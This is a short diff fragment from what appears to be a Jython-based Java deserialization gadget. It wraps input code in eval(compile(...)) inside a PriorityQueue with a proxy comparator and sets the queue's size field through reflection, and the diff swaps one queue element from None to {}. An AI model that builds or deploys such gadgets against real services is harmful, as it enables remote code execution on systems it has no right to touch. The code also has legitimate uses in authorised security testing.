@@ -22,7 +22,7 @@ codeWrap = 'eval(compile(' + incodestr + ', "", "exec")) or 0'
 comparator = Proxy.newProxyInstance(Comparator.getClassLoader(), [Comparator], handler)
 
 priorityQueue = PriorityQueue(2, comparator)
-priorityQueue.queue = array(Object, [codeWrap, None])
+priorityQueue.queue = array(Object, [codeWrap, {}])
 # respectJavaAccessibility doesn't help us when size the field overlaps with size() the method...
 sizeField = PriorityQueue.getDeclaredField("size")
 sizeField.setAccessible(True)
